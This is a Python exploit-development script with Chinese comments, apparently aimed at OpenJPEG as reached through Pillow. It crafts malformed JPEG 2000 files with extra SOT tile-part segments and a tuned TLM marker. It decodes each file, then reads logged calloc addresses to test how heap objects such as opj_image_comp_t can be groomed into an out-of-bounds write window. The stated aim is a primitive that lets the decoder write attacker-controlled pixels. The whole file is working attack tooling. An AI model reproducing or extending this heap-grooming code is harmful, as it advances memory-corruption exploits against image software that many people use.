#!/usr/bin/env python3
# 旋钮实验：改变【其它 tile 的 TLM 条目数】(default 1)，看能否把 opj_image_comp_t(104B)
#   以及 112B/48B 临时块推进 6KB 写窗口 => 为"解码器自己写像素"原语铺路
import os, re, struct, subprocess, sys

BASE = '/tmp/exp/base.j2k'
BUILDER = r'''
import struct, sys
base,out,tile,N,other,A,B,C,e1 = (sys.argv[1],sys.argv[2],int(sys.argv[3]),int(sys.argv[4]),
                                  int(sys.argv[5]),int(sys.argv[6],0),int(sys.argv[7],0),
                                  int(sys.argv[8],0),int(sys.argv[9]))
d = bytearray(open(base,'rb').read())
eoc = d.rfind(b'\xff\xd9')
si = d.find(b'\xff\x51', d.find(b'\xff\x4f'))
siz_end = si+2+struct.unpack('>H', d[si+2:si+4])[0]
ntiles = 4
head = siz_end + (4 + 3*(N + (ntiles-1)*other))
S_N = A-4
p1 = S_N-head-(N-2)*14-12+e1
pB = B-A-14
pC = C-B-14
if min(p1,pB,pC) < 0: sys.exit('NEG %d %d %d'%(p1,pB,pC))
plens=[0]*(N+2); plens[0]=p1; plens[N]=pB; plens[N+1]=pC
extra=b''
for k in range(N+2):
    pl=plens[k]; payload=b'A'*pl if pl else b''; psot=14+pl
    extra += bytes([0xff,0x90])+struct.pack('>H',10)+struct.pack('>H',tile)+ \
             struct.pack('>I',psot)+bytes([1+k,0])+bytes([0xff,0x93])+payload
buf = bytearray(bytes(d[:eoc])+extra+bytes(d[eoc:]))
ents=b''
for t in range(ntiles):
    for _ in range(N if t==tile else other):
        ents += bytes([t])+struct.pack('>H',1)
TLM = bytes([0xff,0x55])+struct.pack('>H',4+len(ents))+bytes([0,0x10])+ents
buf = bytearray(bytes(buf[:siz_end])+TLM+bytes(buf[siz_end:]))
i = siz_end+len(TLM)
while i < len(buf)-12:
    if buf[i]==0xff and buf[i+1]==0x90:
        L=struct.unpack('>H',buf[i+2:i+4])[0]; buf[i+11]=0; i+=2+L
    else: i+=1
open(out,'wb').write(bytes(buf))
'''


def build(out, tile, N, other, e1=-370):
    r = subprocess.run([sys.executable, '-c', BUILDER, BASE, out, str(tile), str(N),
                        str(other), hex(0x1000), hex(0x2000), hex(0x3000), str(e1)],
                       capture_output=True, text=True)
    return r.stdout.strip(), r.stderr.strip()


def measure(path):
    LOG = '/tmp/knob.log'
    pid = os.fork()
    if pid == 0:
        fd = os.open(LOG, os.O_WRONLY | os.O_CREAT | os.O_TRUNC)
        os.dup2(fd, 2)
        from PIL import Image
        try:
            im = Image.open(path); im.load()
        except BaseException:
            pass
        os._exit(0)
    os.waitpid(pid, 0)
    log = open(LOG, errors='ignore').read()
    arr = None
    hits = []
    for ln in log.splitlines():
        m = re.search(r'calloc\] n=%d s=24 -> (0x[0-9a-f]+)' % 23, ln)
        if m:
            arr = int(m.group(1), 16)
        m = re.search(r'calloc\] n=1 s=(\d+) -> (0x[0-9a-f]+)', ln)
        if m and arr:
            sz = int(m.group(1)); a = int(m.group(2), 16)
            if 0 < a - arr < 0x1800:
                hits.append((sz, a - arr))
    return arr, hits


print("%-6s %-10s %-10s %s" % ("other", "arr", "文件字节", "窗口内(尺寸->delta)"))
for other in (1, 2, 4, 8, 16, 32, 64):
    p = '/tmp/knob_%d.j2k' % other
    out, err = build(p, 0, 23, other)
    if 'NEG' in out + err:
        print("%-6d build失败 %s" % (other, (out + err)[:50]))
        continue
    arr, hits = measure(p)
    print("%-6d %-10s %-10s %s" % (other, hex(arr) if arr else '?',
                                    os.path.getsize(p), [(sz, hex(d)) for sz, d in hits]))